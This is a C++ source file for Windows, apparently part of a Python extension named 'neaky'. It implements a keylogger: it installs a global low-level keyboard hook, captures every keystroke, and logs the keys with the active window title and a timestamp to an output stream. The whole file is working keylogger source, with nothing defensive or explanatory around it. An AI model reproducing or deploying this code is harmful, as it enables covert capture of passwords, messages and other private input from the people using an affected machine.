#define WIN32_LEAN_AND_MEAN             // 从 Windows 头文件中排除极少使用的内容
// Windows 头文件
#include <windows.h>
#include <cstdio>
#include <iostream>
#include <fstream>
#include <time.h>

#include <neaky/utils.h>
#include "keylog.h"

#define PY_SSIZE_T_CLEAN
#include <Python.h>
#include "../neakymodule.h"

HHOOK _hook;

KBDLLHOOKSTRUCT kbdStruct;

static std::ostream * outStream;

static LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		// valid action: HC_ACTION.
		if (wParam == WM_KEYDOWN)
		{
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
			LogKeyStoke(outStream ,kbdStruct.vkCode);
		}
	}

	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

static BOOL KeyLoggerInit(std::ostream* os)
{
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		PyErr_SetString(NeakyError, "Failed to install hook!");
		return FALSE;
	}

	// outStream.open("KeyLog.txt", std::ios_base::app);
	//outStream = new std::ostream(std::cout.rdbuf());
	outStream = os;
	return TRUE;
}

static void KeyLoggerFini()
{
	UnhookWindowsHookEx(_hook);
	outStream = NULL;
}

void LogKeyStoke(std::ostream* out, DWORD key_stroke)
{
	//std::cout << key_stroke << '\n';

	static char lastwindow[256] = "";

	if ((key_stroke == 1) || (key_stroke == 2))
		return; // ignore mouse clicks
	
	HWND foreground = GetForegroundWindow();
	DWORD threadID;
	HKL layout = NULL;
	if (foreground) {
		//get keyboard layout of the thread
		threadID = GetWindowThreadProcessId(foreground, NULL);
		layout = GetKeyboardLayout(threadID);
	}

	if (foreground)
	{
		char window_title[256];
		GetWindowTextA(foreground, (LPSTR)window_title, 256);

		if (strcmp(window_title, lastwindow) != 0) {
			strcpy(lastwindow, window_title);

			// get time
			time_t t = time(NULL);
			struct tm* tm = localtime(&t);
			char s[64];
			strftime(s, sizeof(s), "%c", tm);

			*out << "\n\n[当前窗口: " << window_title << " - at " << s << "] \n";
		}
	}

	if (key_stroke == VK_BACK)
		*out << "[BACKSPACE]";
	else if (key_stroke == VK_RETURN)
		*out << "\n";
	else if (key_stroke == VK_SPACE)
		*out << " ";
	else if (key_stroke == VK_TAB)
		*out << "[TAB]";
	else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
		*out << "[SHIFT]";
	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
		*out << "[CONTROL]";
	else if (key_stroke == VK_ESCAPE)
		*out << "[ESCAPE]";
	else if (key_stroke == VK_END)
		*out << "[END]";
	else if (key_stroke == VK_HOME)
		*out << "[HOME]";
	else if (key_stroke == VK_LEFT)
		*out << "[LEFT]";
	else if (key_stroke == VK_UP)
		*out << "[UP]";
	else if (key_stroke == VK_RIGHT)
		*out << "[RIGHT]";
	else if (key_stroke == VK_DOWN)
		*out << "[DOWN]";
	else if (key_stroke == 190 || key_stroke == 110)
		*out << ".";
	else if (key_stroke == 189 || key_stroke == 109)
		*out << "-";
	else if (key_stroke == 20)
		*out << "[CAPSLOCK]";
	else {
		char key;
		// check caps lock
		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		// check shift key
		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
			lowercase = !lowercase;
		}

		//map virtual key according to keyboard layout 
		key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

		//tolower converts it to lowercase properly
		if (!lowercase) key = tolower(key);
		*out << char(key);
	}

	//instead of opening and closing file handlers every time, keep file open and flush.
	(*out).flush();
	return;
}

KeyLoggerInterface HookKeyLogger = {
	KeyLoggerInit,
	KeyLoggerFini
};